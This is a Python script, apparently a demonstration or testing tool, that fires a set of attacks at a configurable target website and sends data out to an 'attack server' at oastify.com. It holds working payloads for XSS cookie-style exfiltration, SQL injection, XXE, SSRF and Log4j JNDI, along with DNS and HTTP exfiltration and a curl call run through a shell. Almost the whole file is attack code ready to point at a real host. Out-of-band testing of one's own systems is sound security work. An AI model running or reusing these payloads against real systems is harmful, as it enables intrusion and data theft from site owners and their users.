import requests
import subprocess
import dns.resolver

# Configuration
DEMO_WEBSITE_URL = "http://oobserver.net"  # Update to your demo website URL
ATTACKER_SERVER_URL = "http://oastify.com"  # Update to your attack server URL

def check_server():
    """Check if the attack server is reachable."""
    try:
        response = requests.get(f"{ATTACKER_SERVER_URL}/test?data=test")
        if response.status_code == 200:
            print("Attack server is reachable.")
        else:
            print(f"Attack server returned status code: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"Failed to connect to the attack server: {e}")
        exit(1)

def dns_exfiltration(data):
    """Perform DNS exfiltration."""
    domain = f"{data}.oastify.com"  # Example domain, adjust as needed
    try:
        dns.resolver.resolve(domain, 'A')
    except Exception as e:
        print(f"DNS exfiltration error: {e}")

def http_exfiltration(data):
    """Perform HTTP exfiltration."""
    url = f"{ATTACKER_SERVER_URL}/http?data={data}"
    try:
        requests.get(url)
    except Exception as e:
        print(f"HTTP exfiltration error: {e}")

def command_injection(data):
    """Perform command injection."""
    try:
        cmd = f"curl {ATTACKER_SERVER_URL}/cmd?data={data}"
        subprocess.run(cmd, shell=True)
    except Exception as e:
        print(f"Command injection error: {e}")

def xss_exfiltration(data):
    """Perform XSS exfiltration."""
    payload = f"<script>new Image().src='{ATTACKER_SERVER_URL}/xss?data={data}';</script>"
    try:
        response = requests.post(f"{DEMO_WEBSITE_URL}/xss", data={"input": payload})
        print(f"XSS exfiltration response status code: {response.status_code}")
    except Exception as e:
        print(f"XSS exfiltration error: {e}")

def sql_injection(data):
    """Perform SQL injection."""
    payload = f"1' UNION SELECT '{data}'--"
    try:
        response = requests.get(f"{DEMO_WEBSITE_URL}/search?query={payload}")
        print(f"SQL injection response status code: {response.status_code}")
    except Exception as e:
        print(f"SQL injection error: {e}")

def xxe_exfiltration(data):
    """Perform XXE exfiltration."""
    payload = f"""<?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE foo [<!ENTITY xxe SYSTEM "{ATTACKER_SERVER_URL}/xxe?data={data}">]>
    <foo>&xxe;</foo>"""
    headers = {'Content-Type': 'application/xml'}
    try:
        response = requests.post(f"{DEMO_WEBSITE_URL}/xxe", data=payload, headers=headers)
        print(f"XXE exfiltration response status code: {response.status_code}")
    except Exception as e:
        print(f"XXE exfiltration error: {e}")

def ssrf_exfiltration(data):
    """Perform SSRF exfiltration."""
    payload = f"{ATTACKER_SERVER_URL}/ssrf?data={data}"
    try:
        response = requests.get(f"{DEMO_WEBSITE_URL}/fetch?url={payload}")
        print(f"SSRF exfiltration response status code: {response.status_code}")
    except Exception as e:
        print(f"SSRF exfiltration error: {e}")

def log4j_exfiltration(data):
    """Perform Log4j exfiltration."""
    payload = f"${{jndi:ldap://oastify.com/log4j?data={data}}}"
    headers = {'User-Agent': payload}
    try:
        response = requests.get(DEMO_WEBSITE_URL, headers=headers)
        print(f"Log4j exfiltration response status code: {response.status_code}")
    except Exception as e:
        print(f"Log4j exfiltration error: {e}")

def main():
    data_to_exfiltrate = "sensitive_data"

    print("Checking if attack server is reachable...")
    check_server()

    print("Performing DNS Exfiltration...")
    dns_exfiltration(data_to_exfiltrate)

    print("Performing HTTP Exfiltration...")
    http_exfiltration(data_to_exfiltrate)

    print("Performing Command Injection...")
    command_injection(data_to_exfiltrate)

    print("Performing XSS Exfiltration...")
    xss_exfiltration(data_to_exfiltrate)

    print("Performing SQL Injection...")
    sql_injection(data_to_exfiltrate)

    print("Performing XXE Exfiltration...")
    xxe_exfiltration(data_to_exfiltrate)

    print("Performing SSRF Exfiltration...")
    ssrf_exfiltration(data_to_exfiltrate)

    print("Performing Log4j Exfiltration...")
    log4j_exfiltration(data_to_exfiltrate)

if __name__ == "__main__":
    main()
